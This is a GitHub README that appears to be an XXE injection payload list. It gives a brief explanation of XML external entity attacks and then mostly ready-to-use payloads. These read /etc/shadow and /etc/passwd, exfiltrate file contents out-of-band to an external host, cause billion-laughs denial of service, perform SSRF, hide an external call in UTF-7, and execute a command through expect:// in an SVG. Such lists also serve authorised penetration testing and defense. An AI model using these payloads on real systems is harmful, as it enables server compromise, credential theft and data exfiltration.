### XML External Entity (XXE) Injection Payload List
<p align="center">
  <img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/xxe-injection-payload-list?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/xxe-injection-payload-list?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/xxe-injection-payload-list"> <img src="https://img.shields.io/github/license/payloadbox/command-injection-payload-list"> <img src="https://img.shields.io/github/issues/detail/author/payloadbox/command-injection-payload-list/1">
</p>

In this section, we'll explain what XML external entity injection is, describe some common examples, explain how to find and exploit various kinds of XXE injection, and summarize how to prevent XXE injection attacks. 

#### What is XML external entity injection?

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks. 

<p align="center"> 
<img src="/Image/xxe-injection.jpg">
</p>

There are various types of XXE attacks: 

|XXE Attack Type               |Description                          |
|----------------|-------------------------------|
|Exploiting XXE to Retrieve Files| Where an external entity is defined containing the contents of a file, and returned in the application's response. |
|Exploiting XXE to Perform SSRF Attacks| Where an external entity is defined based on a URL to a back-end system. |
|Exploiting Blind XXE Exfiltrate Data Out-of-Band| Where sensitive data is transmitted from the application server to a system that the attacker controls. |
|Exploiting blind XXE to Retrieve Data Via Error Messages | Where the attacker can trigger a parsing error message containing sensitive data. |

##### XML External Entity (XXE) Injection Payloads

###### XXE: Basic XML Example

```
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```

###### XXE: Entity Example

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

###### XXE: File Disclosure

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

###### XXE: Denial-of-Service Example

```
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<tag>&lol9;</tag>
 ```
 
###### XXE: Local File Inclusion Example
 
 ```
 <?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 ```
 
###### XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)
 
 ```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
 ```
 
###### XXE: Access Control Bypass (Loading Restricted Resources - PHP example)

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

###### XXE:SSRF ( Server Side Request Forgery ) Example

```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

###### XXE: (Remote Attack - Through External Xml Inclusion) Exmaple

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
<lolz><lol>3..2..1...&test<lol></lolz>
```

###### XXE: UTF-7 Exmaple

```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

###### XXE: Base64 Encoded

```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

###### XXE: XXE inside SOAP Example

```
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

###### XXE: XXE inside SVG

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

#### References :
 
👉 [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)

👉 [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) 

👉 [Testing for XML Injection (OTG-INPVAL-008)](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008))
